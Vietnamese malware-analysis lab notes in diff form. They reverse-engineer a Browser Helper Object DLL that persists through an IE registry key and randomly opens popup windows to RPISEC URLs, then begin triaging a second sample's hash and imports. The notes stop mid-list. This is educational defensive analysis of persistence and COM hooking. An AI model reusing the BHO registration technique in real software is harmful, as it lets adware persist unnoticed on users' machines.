@@ -56,4 +56,1777 @@ TerminateProcess
 Đây là những chuỗi khả nghi trong chương trình. 
 - Đầu tiên là các URL lạ, phù hợp với trường hợp được ghi nhận trong đề: random popups.
 - Tiếp đến là `explorer.exe`, có nhiều hướng để khai thác từ chuỗi này.
-- `CLSID...` cái này là định danh
+- `Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{3543619C-D563-43f7-95EA-4DA7E1CC396A}` chuỗi này dùng để khai báo 1 BHO (là 1 loại COM object), đóng vai trò như 1 plugin, gắn trực tiếp vào IE, hoặc đôi khi là gắn vào `explorer.exe`. Cơ chế nạp: Mỗi khi trình duyệt khởi chạy, nó sẽ tự động quét khóa Registry `Browser Helper Objects`. Nếu thấy bất kỳ khóa con nào chứa CLSID (như `{3543619C-D563-43f7-95EA-4DA7E1CC396A}`), hệ điều hành sẽ tìm file `.dll` tương ứng trong `HKCR\CLSID\{...}\InprocServer32` và nạp thẳng DLL đó vào bộ nhớ của tiến trình trình duyệt. Ngoài ra, tham số `NoExplorer` bên dưới có tác dụng cho BHO chỉ gắn vào IE, không gắn vào `explorer.exe`, tránh crash hoặc bị phát hiện.
+
+4. 
+Cơ chế persistence được sử dụng ở đây đó là tạo 1 BHO gắn vào IE (như đã nói ở bài 3), dấu hiệu đó là các strings cực kì khả nghi nằm trong file.
+
+**Từ phần này nên đọc lại [[COM]] và [[BHO]] để hiểu rõ trước.**
+5. 
+{3543619C-D563-43f7-95EA-4DA7E1CC396A}
+
+6. 
+Để biết được COM Interface, ta cần tìm IID của nó, từ đó có thể xác nhận được loại Interface sử dụng.
+Đầu tiên ta tìm được `DllGetClassObject`
+```c
+HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
+{
+  void *v4; // [esp+Ch] [ebp-14h]
+  HRESULT v5; // [esp+10h] [ebp-10h]
+  int v6; // [esp+1Ch] [ebp-4h]
+
+  if ( sub_100010E0(Buf1: (void *)rclsid, Buf2: &clsid) == 0 )
+    return -2147221231;
+  if ( IsBadWritePtr(lp: ppv, ucb: 4u) )
+    return -2147467261;
+  *ppv = nullptr;
+  v4 = operator new(Size: 0x10u);
+  v6 = sub_10001120(a1: v4);
+  if ( v6 == 0 )
+    return -2147024882;
+  v5 = (**(int (__stdcall ***)(int, const IID *const, LPVOID *))v6)(a1: v6, a2: riid, a3: ppv);
+  if ( v5 < 0 )
+    (*(void (__thiscall **)(int, int))(*(_DWORD *)v6 + 20))(a1: v6, a2: 1);
+  return v5;
+}
+```
+Prototype:
+```c
+HRESULT DllGetClassObject(
+    REFCLSID rclsid,
+    REFIID riid,
+    LPVOID *ppv
+);
+```
+3 tham số:
+```
+rclsid = Windows muốn tạo COM class nào?
+riid   = Windows muốn DLL trả về interface nào?
+ppv    = địa chỉ để DLL ghi interface pointer vào
+```
+Hình dung Windows hỏi DLL:
+> “Trong DLL của mày có class mang CLSID này không? Nếu có, đưa tao interface mà tao yêu cầu.”
+
+Khối `if` đầu tiên:
+```c
+if ( sub_100010E0(Buf1: (void *)rclsid, Buf2: &unk_1000479C) == 0 )
+    return -2147221231;
+BOOL __cdecl sub_100010E0(void *Buf1, void *Buf2)
+{
+  return memcmp(Buf1, Buf2, Size: 0x10u) == 0;
+}    
+```
+Ta thấy nó đang thực hiện so sánh 2 vùng nhớ, mà vùng nhớ 1 là 1 clsid mà hệ điều hành yêu cầu, nên vùng nhớ 2 cũng là 1 clsid, rename lại:
+```c
+if ( sub_100010E0(Buf1: (void *)rclsid, Buf2: &clsid) == 0 )
+    return -2147221231;
+```
+Giá trị trả về:
+```
+-2147221231
+= 0x80040111
+= CLASS_E_CLASSNOTAVAILABLE
+```
+Nghĩa là:
+> Nếu CLSID Windows yêu cầu không khớp CLSID mà DLL hỗ trợ, DLL báo “class này không có”.
+
+Sau khi xác nhận đúng clsid, code chạy tiếp:
+```c
+if (IsBadWritePtr(ppv, 4u))
+    return -2147467261;
+
+*ppv = nullptr;
+```
+Đoạn này chỉ là để kiểm tra xem vùng nhớ có ghi được không.
+Tiếp theo:
+```cpp
+v4 = operator new(0x10u);
+v6 = sub_10001120(v4);
+```
+`operator new` là 1 hàm cấp phát bộ nhớ, tương tự với `malloc`, ở đây chương trình yêu cầu cấp phát 1 vùng nhớ 16 byte, và con trỏ lưu vào v4. Sau đó nó truyền v4 vào hàm `sub_10001120` và thưc thi hàm đó.
+```cpp
+_DWORD *__thiscall sub_10001120(_DWORD *this)
+{
+  sub_100012C0(a1: &dword_10006590, a2: 2);
+  *this = &CClassFactory::`vftable';
+  return this;
+}
+```
+Hàm này thực hiện ghi địa chỉ của vtable classfactory vào con trỏ `this` (là con trỏ trỏ đến đối tượng).
+```
+ClassFactory object
++0x00 → CClassFactory::vftable
++0x04 → field khác
++0x08 → field khác
++0x0C → field khác
+```
+Bảng vtable của classfactory như này:
+```asm
+.rdata:1000425C ; const CClassFactory::`vftable'
+.rdata:1000425C ??_7CClassFactory@@6B@ dd offset sub_10001330
+.rdata:1000425C                                         ; DATA XREF: sub_10001120+19↑o
+.rdata:1000425C                                         ; sub_10001180+A↑o
+.rdata:10004260                 dd offset sub_100013C0
+.rdata:10004264                 dd offset sub_100013E0
+.rdata:10004268                 dd offset sub_100011A0
+.rdata:1000426C                 dd offset sub_100012A0
+.rdata:10004270                 dd offset sub_10001150
+.rdata:10004274                 dd offset ??_R4?$CUnknown@UIClassFactory@@@@6B@ ; const CUnknown<IClassFactory>::`RTTI Complete Object Locator'
+```
+Layout:
+```
+slot 0  +0x00  QueryInterface
+slot 1  +0x04  AddRef
+slot 2  +0x08  Release
+slot 3  +0x0C  CreateInstance
+slot 4  +0x10  LockServer
+```
+Ánh xạ vào:
+```
+sub_10001330 → QueryInterface
+sub_100013C0 → AddRef
+sub_100013E0 → Release
+sub_100011A0 → CreateInstance
+sub_100012A0 → LockServer
+```
+Phần tử còn lại không cần thiết, bỏ qua:
+Vậy là đã xong bước 2 của sơ đồ:
+```
+[iexplore.exe]
+      │
+      ├── 1. Gọi DllGetClassObject(...) ─────────► [DLL trả về con trỏ IClassFactory*]
+      │
+      ├── 2. Gọi pFactory->CreateInstance(...) ──► [DLL chạy 'new CMyBHO' trên Heap]
+      │                                            (Con trỏ 'this' của BHO sinh ra tại đây)
+      │
+      ├── 3. Gọi pFactory->Release() ────────────► [Hủy bỏ đối tượng Factory vì xong việc]
+      │
+      ├── 4. Gọi pBHO->QueryInterface(           
+      │        IID_IObjectWithSite, &pSite) ─────► [Lấy Vtable IObjectWithSite của BHO]
+      │
+      ├── 5. Gọi pSite->SetSite(pUnkSite) ───────► [Nhảy vào hàm sub_100020B0]
+      │                                                    │
+      │                                     (Bên trong SetSite)
+      │                                                    ▼
+      │                                     - QueryInterface lấy IConnectionPointContainer
+      │                                     - FindConnectionPoint lấy IConnectionPoint
+      │                                     - Advise để gắn EventSink (&unk_1000658C)
+      │                                                    │
+      ▼                                                    ▼
+[Hoàn tất khởi tạo] ◄─────────────────────── [SetSite trả về S_OK (0)]
+```
+Theo lí thuyết, ta đã biết rằng từ ClassFactory, gọi đến `CreateInstace` để tạo ra Class cuối cùng. Ta sẽ vào hàm `sub_100011A0` để xem nó làm gì.
+```c
+int __stdcall sub_100011A0(int a1, int a2, int a3, _DWORD *lp)
+{
+  void *Block; // [esp+10h] [ebp-20h]
+  int v6; // [esp+14h] [ebp-1Ch]
+  int v7; // [esp+20h] [ebp-10h]
+
+  if ( a2 != 0 )
+    return -2147221232;
+  if ( IsBadWritePtr(lp, ucb: 4u) )
+    return -2147467261;
+  *lp = 0;
+  Block = operator new(Size: 0x1Cu);
+  v7 = sub_10001FE0(a1: Block);
+  if ( v7 == 0 )
+    return -2147024882;
+  v6 = (**(int (__stdcall ***)(int, int, _DWORD *))v7)(a1: v7, a2: a3, a3: lp);
+  if ( v6 < 0 )
+    (*(void (__thiscall **)(int, int))(*(_DWORD *)v7 + 20))(a1: v7, a2: 1);
+  return v6;
+}
+```
+Tương tự như hàm `DllGetClassObject`. Tiếp tục vào hàm `sub_10001FE0`:
+```c
+_DWORD *__thiscall sub_10001FE0(_DWORD *this)
+{
+  sub_100022A0(a1: &dword_100065B0, a2: 2);
+  *this = &CObjectWithSite::`vftable';
+  *(this + 6) = 0;
+  *(this + 4) = 0;
+  *(this + 5) = 0;
+  return this;
+}
+```
+Nó gắn cho con trỏ this 1 vtable `CObjectWithSize`, đây khả năng là đối tượng mà hàm `CreateInstance` sẽ tạo ra, truy cập vào:
+```
+rdata:100047EC ??_7CObjectWithSite@@6B@ dd offset sub_10001330
+.rdata:100047EC                                         ; DATA XREF: sub_10001FE0+19↑o
+.rdata:100047EC                                         ; sub_10002060+29↑o
+.rdata:100047F0                 dd offset sub_100013C0
+.rdata:100047F4                 dd offset sub_100013E0
+.rdata:100047F8                 dd offset sub_100020B0
+.rdata:100047FC                 dd offset sub_10002120
+.rdata:10004800                 dd offset sub_10002030
+.rdata:10004804                 align 10h
+.rdata:10004810 ; Debug Directory entries
+```
+Layout của nó cũng tương tự với `IObjectWithSite`:
+```
+0x0: QueryInterface.
+0x4: AddRef.
+0x8: Release.
+0xC: SetSite(IUnknown \*pUnkSite).
+0x10: GetSite(REFIID riid, void \*\*ppvSite).
+```
+Ánh xạ vào, ta biết hàm `sub_100020B0` là hàm `SetSite`
+```c
+int __thiscall sub_100020B0(void *this, int a2, int a3)
+{
+  int v5; // [esp+0h] [ebp-4h]
+
+  if ( a3 != 0 )
+    (*(void (__stdcall **)(int))(*(_DWORD *)a3 + 4))(a1: a3);
+  sub_10002220(a1: a2, a2: this);
+  if ( a3 == 0 )
+    return 0;
+  v5 = (**(int (__stdcall ***)(int, const IID *, int))a3)(a1: a3, a2: &riid, a3: a2 + 16);
+  (*(void (__stdcall **)(int))(*(_DWORD *)a3 + 8))(a1: a3);
+  if ( v5 < 0 )
+    return v5;
+  sub_10002180(a1: a2);
+  return 0;
+}
+```
+Prototype:
+```c
+int __stdcall CObjectWithSite_SetSite(
+    void *This,
+    void *pUnkSite
+);
+```
+Nhưng trên hàm trên thì nó lại nhận vào 3 tham số, nhờ AI phân tích code, ta biết rằng IDA đã phân tích sai. Sửa lại:
+```c
+int __stdcall sub_100020B0(void *This, void *pUnkSite)
+{
+  int v3; // [esp+0h] [ebp-4h]
+
+  if ( pUnkSite != nullptr )
+    (*(void (__stdcall **)(void *))(*(_DWORD *)pUnkSite + 4))(a1: pUnkSite);
+  sub_10002220(This);
+  if ( pUnkSite == nullptr )
+    return 0;
+  v3 = (**(int (__stdcall ***)(void *, const IID *, char *))pUnkSite)(a1: pUnkSite, a2: &riid, a3: (char *)This + 16);
+  (*(void (__stdcall **)(void *))(*(_DWORD *)pUnkSite + 8))(a1: pUnkSite);
+  if ( v3 < 0 )
+    return v3;
+  sub_10002180(a1: This);
+  return 0;
+}
+```
+Giờ thì chuẩn rồi.
+Khối `if` đầu tiên:
+```c
+if ( pUnkSite != nullptr )
+    (*(void (__stdcall **)(void *))(*(_DWORD *)pUnkSite + 4))(a1: pUnkSite);
+```
+Khối này để kiểm tra xem `pUnkSite` có được truyền vào không, nếu có thì dùng method `AddRef` (được định nghĩa sẵn cho 1 đối tượng Unknown Site, xem lại lí thuyết).
+Tiếp đến, nó thực hiện hàm `sub_10002220` với tham số truyền vào là còn trỏ `this`
+```c
+int __stdcall sub_100020B0(void *This, void *pUnkSite)
+{
+  int v3; // [esp+0h] [ebp-4h]
+
+  if ( pUnkSite != nullptr )
+    (*(void (__stdcall **)(void *))(*(_DWORD *)pUnkSite + 4))(a1: pUnkSite);
+  sub_10002220(This);
+  if ( pUnkSite == nullptr )
+    return 0;
+  v3 = (**(int (__stdcall ***)(void *, const IID *, char *))pUnkSite)(a1: pUnkSite, a2: &riid, a3: (char *)This + 16);
+  (*(void (__stdcall **)(void *))(*(_DWORD *)pUnkSite + 8))(a1: pUnkSite);
+  if ( v3 < 0 )
+    return v3;
+  sub_10002180(a1: This);
+  return 0;
+}
+```
+Có một điều khá vô lí là ở con trỏ `this`, chỉ có duy nhất `vtable` là đã được khởi tạo, còn lại đều chưa, có thể là nó sẽ chạy trong 1 lần lặp nào đó, còn lần khởi tạo này thì chưa. Ta tạm thời bỏ qua hàm này.
+Tiếp đó là lệnh:
+```c
+v3 = (**(int (__stdcall ***)(void *, const IID *, char *))pUnkSite)(a1: pUnkSite, a2: &riid, a3: (char *)This + 16);
+```
+Lệnh này thực hiện gọi đến hàm ở đầu của `vtable` của `pUnkSite` với các tham số lần lượt là: con trỏ `this` (ở đây chính là `pUnkSite`), riid, và `this + 16`. Theo lý thuyết, hàm đầu tiên của `vtable` là `QueryInterface`, thực hiện truy vấn Object xem có hỗ trợ Interface có IID cho trước không. Check thử `riid`:
+```
+IID <0D30C1661h, 0CDAFh, 11D0h, <8Ah, 3Eh, 0, 0C0h, 4Fh, 0C9h, 0E2h, \
+```
+Vậy, có nghĩa là BHO đang truy vấn xem `pUnkSite` (Object của IE, do IE truyền vào) xem có hỗ trợ Interface ==WebBrowser2==![[Pasted image 20260921233640.png]]
+
+7. 
+Ở câu trước, ta đã xác định malware lấy được con trỏ tới interface:
+```cpp
+IWebBrowser2
+```
+Để tìm những method mà malware gọi từ interface này, ta cần tìm các lời gọi gián tiếp thông qua vtable của `IWebBrowser2`.
+*Tìm hàm xử lý sự kiện của Internet Explorer*
+Trong hàm `sub_10002180`, malware gọi:
+```cpp
+This->pConnectionPoint->Advise(
+    (IUnknown *)&unk_1000658C,
+    &This->connectionCookie
+);
+```
+Địa chỉ `unk_1000658C` được truyền vào `Advise` với vai trò event sink. Kiểm tra nơi khởi tạo vùng nhớ này:
+```cpp
+int sub_10001060()
+{
+  return sub_10001710(a1: &unk_1000658C);
+}
+```
+Tiếp tục đi vào `sub_10001710`:
+```cpp
+_DWORD *__thiscall sub_10001710(_DWORD *this)
+{
+  sub_10001730(a1: this);
+  *this = &CEventSink::`vftable';
+  return this;
+}
+```
+Hàm này gắn `CEventSink::vftable` vào object tại `unk_1000658C`. Vtable của nó như sau:
+```asm
+.rdata:100047B0 ; const CEventSink::`vftable'
+.rdata:100047B0 dd offset sub_10001750
+.rdata:100047B4 dd offset sub_100017D0
+.rdata:100047B8 dd offset sub_100017D0
+.rdata:100047BC dd offset sub_100017E0
+.rdata:100047C0 dd offset sub_100017F0
+.rdata:100047C4 dd offset sub_10001800
+.rdata:100047C8 dd offset sub_10001810
+```
+`CEventSink` implement `IDispatch`, nên có layout:
+```text
++0x00  QueryInterface
++0x04  AddRef
++0x08  Release
++0x0C  GetTypeInfoCount
++0x10  GetTypeInfo
++0x14  GetIDsOfNames
++0x18  Invoke
+```
+Ánh xạ vào vtable:
+```text
+sub_10001750 → QueryInterface
+sub_100017D0 → AddRef
+sub_100017D0 → Release
+sub_100017E0 → GetTypeInfoCount
+sub_100017F0 → GetTypeInfo
+sub_10001800 → GetIDsOfNames
+sub_10001810 → Invoke
+```
+Như vậy, `sub_10001810` chính là `IDispatch::Invoke`, được IE gọi khi một browser event xảy ra.
+Trong hàm này có đoạn:
+```cpp
+if ( a2 == 250 )
+{
+    ...
+    v14 = sub_10001AD0(
+        a1: pvarg.lVal,
+        a2: v18.lVal,
+        a3: v19.lVal,
+        a4: (int)ppvData,
+        a5: v13,
+        a6: v21.lVal,
+        a7: v16
+    );
+
+    if ( v14 != 0 )
+        *(*a6)->bstrVal = -1;
+    else
+        *(*a6)->bstrVal = 0;
+}
+```
+`a2` là `DISPID` của browser event. Giá trị:
+```text
+250 = DWebBrowserEvents2::BeforeNavigate2
+```
+Do đó, mỗi khi IE chuẩn bị điều hướng tới một URL, nó gọi `CEventSink::Invoke`, sau đó malware chuyển việc xử lý sang:
+```cpp
+sub_10001AD0
+```
+*Phân tích `sub_10001AD0`*
+Toàn bộ hàm:
+```cpp
+char __stdcall sub_10001AD0(
+    int a1,
+    int a2,
+    int a3,
+    int a4,
+    int a5,
+    int a6,
+    char a7)
+{
+  unsigned int v7; // eax
+  int v9; // eax
+  int v10; // eax
+  int v11; // [esp-10h] [ebp-4Ch]
+  int v12; // [esp-Ch] [ebp-48h]
+  int v13; // [esp-8h] [ebp-44h]
+  int v14; // [esp-4h] [ebp-40h]
+  _BYTE v15[4]; // [esp+8h] [ebp-34h] BYREF
+  HRESULT v16; // [esp+Ch] [ebp-30h]
+  LPVOID ppv; // [esp+10h] [ebp-2Ch] BYREF
+  LPCCH lpMultiByteStr[6]; // [esp+14h] [ebp-28h]
+  int v19; // [esp+38h] [ebp-4h]
+
+  lpMultiByteStr[0] = "http://rpis.ec/";
+  lpMultiByteStr[1] = "http://rpis.ec/binexp";
+  lpMultiByteStr[2] = "https://twitter.com/RPISEC";
+  lpMultiByteStr[3] =
+    "https://www.facebook.com/"
+    "RPI-Computer-Security-Club-RPISEC-121207327959689/timeline/";
+  lpMultiByteStr[4] = "http://blog.rpis.ec/";
+  lpMultiByteStr[5] =
+    "http://security.cs.rpi.edu/courses/binexp-spring2015/";
+
+  ppv = nullptr;
+
+  v7 = sub_10001AB0(Time: nullptr);
+  srand(Seed: v7);
+
+  if ( rand() % 3 != 0 )
+    return a7;
+
+  if ( CoInitialize(pvReserved: nullptr) < 0 )
+    return a7;
+
+  v16 = CoCreateInstance(
+          rclsid: &rclsid,
+          pUnkOuter: nullptr,
+          dwClsContext: 4u,
+          riid: &riid,
+          &ppv
+        );
+
+  if ( v16 == 0 )
+  {
+    v9 = rand();
+
+    sub_10001490(
+        lpMultiByteStr: lpMultiByteStr[v9 % 6]
+    );
+
+    v19 = 0;
+
+    (*(void (__stdcall **)(LPVOID, int))
+        (*(_DWORD *)ppv + 164))(
+            a1: ppv,
+            a2: 1
+        );
+
+    v10 = sub_10001550(
+            a1: v15,
+            a2: 0,
+            a3: 0,
+            a4: 0,
+            a5: 0
+          );
+
+    (*(void (__stdcall **)
+        (LPVOID, int, int, int, int, int))
+        (*(_DWORD *)ppv + 44))(
+            a1: ppv,
+            a2: v10,
+            a3: v11,
+            a4: v12,
+            a5: v13,
+            a6: v14
+        );
+
+    v19 = -1;
+    sub_10001530(a1: v15);
+  }
+
+  return 0;
+}
+```
+==Khởi tạo danh sách URL==
+Đầu tiên, malware tạo một mảng chứa sáu URL:
+```cpp
+lpMultiByteStr[0] = "http://rpis.ec/";
+lpMultiByteStr[1] = "http://rpis.ec/binexp";
+lpMultiByteStr[2] = "https://twitter.com/RPISEC";
+lpMultiByteStr[3] =
+  "https://www.facebook.com/"
+  "RPI-Computer-Security-Club-RPISEC-121207327959689/timeline/";
+lpMultiByteStr[4] = "http://blog.rpis.ec/";
+lpMultiByteStr[5] =
+  "http://security.cs.rpi.edu/courses/binexp-spring2015/";
+```
+Đây là sáu địa chỉ mà malware có thể mở trong cửa sổ Internet Explorer mới.
+==Tạo giá trị ngẫu nhiên==
+Tiếp theo:
+```cpp
+v7 = sub_10001AB0(Time: nullptr);
+srand(Seed: v7);
+
+if ( rand() % 3 != 0 )
+    return a7;
+```
+`sub_10001AB0` lấy giá trị thời gian, sau đó dùng nó làm seed cho `srand`.
+Điều kiện:
+```cpp
+rand() % 3 != 0
+```
+có nghĩa là hàm chỉ chạy tiếp khi:
+```cpp
+rand() % 3 == 0
+```
+Xác suất xảy ra trường hợp này là khoảng:
+```text
+1/3
+```
+Vì vậy, malware không mở pop-up trong mọi lần điều hướng, mà chỉ mở ngẫu nhiên khoảng một phần ba số lần.
+==Khởi tạo COM==
+Tiếp theo:
+```cpp
+if ( CoInitialize(pvReserved: nullptr) < 0 )
+    return a7;
+```
+`CoInitialize` khởi tạo COM library cho thread hiện tại. Nếu khởi tạo thất bại, hàm kết thúc và không tạo cửa sổ IE mới.
+==Tạo Internet Explorer COM object==
+Sau khi COM được khởi tạo, malware gọi
+```cpp
+v16 = CoCreateInstance(
+        rclsid: &rclsid,
+        pUnkOuter: nullptr,
+        dwClsContext: 4u,
+        riid: &riid,
+        &ppv
+      );
+```
+Trong đó:
+```text
+rclsid        = CLSID của Internet Explorer
+pUnkOuter     = NULL, không sử dụng aggregation
+dwClsContext  = 4 = CLSCTX_LOCAL_SERVER
+riid          = IID_IWebBrowser2
+ppv           = nơi nhận con trỏ IWebBrowser2*
+```
+Nếu thành công:
+```cpp
+v16 == 0
+```
+thì:
+```cpp
+ppv
+```
+sẽ chứa con trỏ tới interface:
+```cpp
+IWebBrowser2 *ppv;
+```
+==Chọn ngẫu nhiên một URL==
+Code tiếp theo:
+```cpp
+v9 = rand();
+
+sub_10001490(
+    lpMultiByteStr: lpMultiByteStr[v9 % 6]
+);
+```
+Phép:
+```cpp
+v9 % 6
+```
+tạo ra giá trị từ `0` tới `5`, tương ứng với một trong sáu phần tử của mảng `lpMultiByteStr`.
+Như vậy, malware chọn ngẫu nhiên một URL trong danh sách rồi chuẩn bị URL đó để truyền cho COM method của `IWebBrowser2`.
+==COM function thứ nhất==
+Lời gọi đầu tiên thông qua vtable của `ppv`:
+```cpp
+(*(void (__stdcall **)(LPVOID, int))
+    (*(_DWORD *)ppv + 164))(
+        a1: ppv,
+        a2: 1
+    );
+```
+Ta phân tích như sau:
+```cpp
+*(_DWORD *)ppv
+```
+lấy địa chỉ vtable của interface `IWebBrowser2`.
+Sau đó:
+```cpp
+*(_DWORD *)ppv + 164
+```
+lấy method tại offset:
+```text
+164 decimal = 0xA4
+```
+Theo layout vtable của `IWebBrowser2`:
+```text
+vtable + 0xA4 = IWebBrowser2::put_Visible
+```
+Vì vậy lời gọi trên tương đương:
+```cpp
+ppv->put_Visible(1);
+```
+Prototype của method:
+```cpp
+HRESULT IWebBrowser2::put_Visible(
+    VARIANT_BOOL Value
+);
+```
+Tham số được truyền vào là một giá trị khác `0`, nên cửa sổ Internet Explorer được đặt thành trạng thái hiển thị.
+Công dụng của method này là:
+> Hiển thị cửa sổ Internet Explorer mới mà malware vừa tạo bằng `CoCreateInstance`.
+
+==Chuẩn bị tham số URL==
+Tiếp theo:
+```cpp
+v10 = sub_10001550(
+        a1: v15,
+        a2: 0,
+        a3: 0,
+        a4: 0,
+        a5: 0
+      );
+```
+Đoạn này chuẩn bị URL cùng các tham số rỗng cần thiết trước khi gọi method điều hướng của `IWebBrowser2`.
+==COM function thứ hai==
+Lời gọi thứ hai thông qua vtable:
+```cpp
+(*(void (__stdcall **)
+    (LPVOID, int, int, int, int, int))
+    (*(_DWORD *)ppv + 44))(
+        a1: ppv,
+        a2: v10,
+        a3: v11,
+        a4: v12,
+        a5: v13,
+        a6: v14
+    );
+```
+Tương tự:
+```cpp
+*(_DWORD *)ppv
+```
+lấy vtable của `IWebBrowser2`.
+Sau đó:
+```cpp
+*(_DWORD *)ppv + 44
+```
+chọn method tại offset:
+```text
+44 decimal = 0x2C
+```
+Theo layout vtable của `IWebBrowser2`:
+```text
+vtable + 0x2C = IWebBrowser2::Navigate
+```
+Prototype của method:
+```cpp
+HRESULT IWebBrowser2::Navigate(
+    BSTR URL,
+    VARIANT *Flags,
+    VARIANT *TargetFrameName,
+    VARIANT *PostData,
+    VARIANT *Headers
+);
+```
+Vì `ppv` là con trỏ interface nên lời gọi có thể viết lại thành:
+```cpp
+ppv->Navigate(
+    URL,
+    &Flags,
+    &TargetFrameName,
+    &PostData,
+    &Headers
+);
+```
+Trong đó `URL` là một trong sáu địa chỉ được malware chọn ngẫu nhiên.
+Công dụng của method này là:
+> Điều hướng cửa sổ Internet Explorer vừa được tạo tới URL mà malware lựa chọn.
+
+==Khôi phục pseudocode dễ đọc==
+Toàn bộ logic chính của hàm có thể viết lại như sau:
+```cpp
+char HandleBeforeNavigate2(/* các tham số event */)
+{
+    const char *urls[6] =
+    {
+        "http://rpis.ec/",
+        "http://rpis.ec/binexp",
+        "https://twitter.com/RPISEC",
+        "https://www.facebook.com/"
+        "RPI-Computer-Security-Club-RPISEC-121207327959689/timeline/",
+        "http://blog.rpis.ec/",
+        "http://security.cs.rpi.edu/courses/binexp-spring2015/"
+    };
+
+    srand(time(NULL));
+
+    // Chỉ tạo pop-up trong khoảng 1/3 số lần
+    if (rand() % 3 != 0)
+        return currentCancelValue;
+
+    if (FAILED(CoInitialize(NULL)))
+        return currentCancelValue;
+
+    IWebBrowser2 *browser = NULL;
+
+    HRESULT hr = CoCreateInstance(
+        CLSID_InternetExplorer,
+        NULL,
+        CLSCTX_LOCAL_SERVER,
+        IID_IWebBrowser2,
+        (void **)&browser
+    );
+
+    if (SUCCEEDED(hr))
+    {
+        const char *selectedUrl = urls[rand() % 6];
+
+        BSTR url = ConvertToBSTR(selectedUrl);
+
+        browser->put_Visible(TRUE);
+
+        browser->Navigate(
+            url,
+            NULL,
+            NULL,
+            NULL,
+            NULL
+        );
+
+        FreeBSTR(url);
+    }
+
+    return FALSE;
+}
+```
+==Kết luận==
+Hai COM method mà malware gọi từ interface `IWebBrowser2` là:
+```text
+IWebBrowser2::put_Visible
+IWebBrowser2::Navigate
+```
+Công dụng:
+```text
+put_Visible → hiển thị cửa sổ Internet Explorer mới.
+
+Navigate    → điều hướng cửa sổ Internet Explorer đó
+              tới một trong sáu URL được chọn ngẫu nhiên.
+```
+Hành vi tổng thể:
+```text
+IE phát sinh event BeforeNavigate2
+        ↓
+CEventSink::Invoke được gọi
+        ↓
+sub_10001AD0 xử lý event
+        ↓
+Khoảng 1/3 số lần sẽ tạo một IE instance mới
+        ↓
+put_Visible hiển thị cửa sổ
+        ↓
+Navigate mở một URL ngẫu nhiên
+```
+Do đó, hai method này được malware sử dụng để tạo ra các cửa sổ pop-up Internet Explorer xuất hiện ngẫu nhiên.
+
+# **Lab_03-2.malware**
+1.
+![[Pasted image 20260922150148.png]]
+MD5: `bf4f5b4ff7ed9c7275496c07f9836028`
+
+![[Pasted image 20260922150305.png]]
+58/70 phần mềm phân tích đánh dấu là độc hại.
+Nhãn phổ biến: `trojan.dqls/skeeyah`
+VT gán vào loại: Trojan, ransomeware
+
+2. 
+*KERNEL32.DLL*
+```
+#	Thunk	Ordinal	Hint	Name
+0	00009890		0104	GetDriveTypeA
+1	000098a0		0120	GetLogicalDrives
+2	000098b4		0090	FindClose
+3	000098c0		011a	GetLastError
+4	000098d0		009d	FindNextFileA
+5	000098e0		008a	FileTimeToSystemTime
+6	000098f8		0094	FindFirstFileA
+7	0000990a		02d3	WinExec
+8	00009914		0057	DeleteFileA
+9	00009922		001b	CloseHandle
+10	00009930		02df	WriteFile
+11	0000993c		0034	CreateFileA
+12	0000994a		02b0	UnmapViewOfFile
+13	0000987a		0159	GetSystemDirectoryA
+14	0000996a		01d6	MapViewOfFile
+15	0000997a		0035	CreateFileMappingA
+16	00009990		01fe	Process32Next
+17	000099a0		01fc	Process32First
+18	000099b2		004c	CreateToolhelp32Snapshot
+19	000099ce		029e	TerminateProcess
+20	000099e2		01ef	OpenProcess
+21	000099f0		0218	ReadFile
+22	000099fc		01f9	PeekNamedPipe
+23	00009a0c		0044	CreateProcessA
+24	00009a1e		0043	CreatePipe
+25	00009d56		01bf	LCMapStringA
+26	0000986e		0028	CopyFileA
+27	00009866		0296	Sleep
+28	0000985a		0308	lstrlenA
+29	0000995c		0112	GetFileSize
+30	00009844		0124	GetModuleFileNameA
+31	00009d46		0261	SetEndOfFile
+32	00009d36		01c2	LoadLibraryA
+33	00009d24		013e	GetProcAddress
+34	00009d18		0131	GetOEMCP
+35	00009d0e		00b9	GetACP
+36	00009d02		00bf	GetCPInfo
+37	00009cf2		01b2	IsBadCodePtr
+38	00009ce2		01b5	IsBadReadPtr
+39	00009cc4		028b	SetUnhandledExceptionFilter
+40	00009d66		01c0	LCMapStringW
+41	00009cb0		00aa	FlushFileBuffers
+42	00009ca0		027c	SetStdHandle
+43	00009c90		01b8	IsBadWritePtr
+44	00009c82		01a2	HeapReAlloc
+45	00009c72		02bb	VirtualAlloc
+46	00009c60		0156	GetStringTypeW
+47	00009abc		022f	RtlUnwind
+48	00009ac8		00ca	GetCommandLineA
+49	00009ada		0174	GetVersion
+50	00009ae8		007d	ExitProcess
+51	00009af6		019f	HeapFree
+52	00009b02		00f7	GetCurrentProcess
+53	00009b16		026a	SetFilePointer
+54	00009b28		0199	HeapAlloc
+55	00009b34		02ad	UnhandledExceptionFilter
+56	00009b50		00b2	FreeEnvironmentStringsA
+57	00009b6a		00b3	FreeEnvironmentStringsW
+58	00009b84		02d2	WideCharToMultiByte
+59	00009b9a		0106	GetEnvironmentStrings
+60	00009bb2		0108	GetEnvironmentStringsW
+61	00009bcc		026d	SetHandleCount
+62	00009bde		0152	GetStdHandle
+63	00009bee		0115	GetFileType
+64	00009bfc		0150	GetStartupInfoA
+65	00009c0e		019d	HeapDestroy
+66	00009c1c		019b	HeapCreate
+67	00009c2a		02bf	VirtualFree
+68	00009c38		01e4	MultiByteToWideChar
+69	00009c4e		0153	GetStringTypeA
+```
+Cụm đầu tiên:
+```
+GetLogicalDrives
+    → GetDriveTypeA
+    → FindFirstFileA / FindNextFileA
+    → CopyFileA hoặc mở và chỉnh sửa file
+```
+- `GetLogicalDrives`: Trả về bitmask cho biết những ổ đĩa nào đang tồn tại.
+- `GetDriveTypeA`: Xác định loại ổ: fixed, removable...
+- `FindFirstFileA`: Bắt đầu tìm file/thư mục theo mẫu.
+- `FindNextFileA`: Tiếp tục tìm kiếm.
+- `FindClose`: Đóng handle Find.
+- `CopyFileA`: Sao chép file nguồn sang file đích.
+- `GetSystemDirectoryA`: Lấy đường dẫn thư mục hệ thống.
+- `GetModuleFileNameA`: Lấy đường dẫn file thực thi của module hiện tại hoặc module được chỉ định.
+Cụm này có thể tạo ra hành vi: Dò ổ đĩa và phát tán các file độc hại.
+Cụm:
+```
+CreatePipe
+→ CreateProcessA
+→ PeekNamedPipe / ReadFile / WriteFile
+```
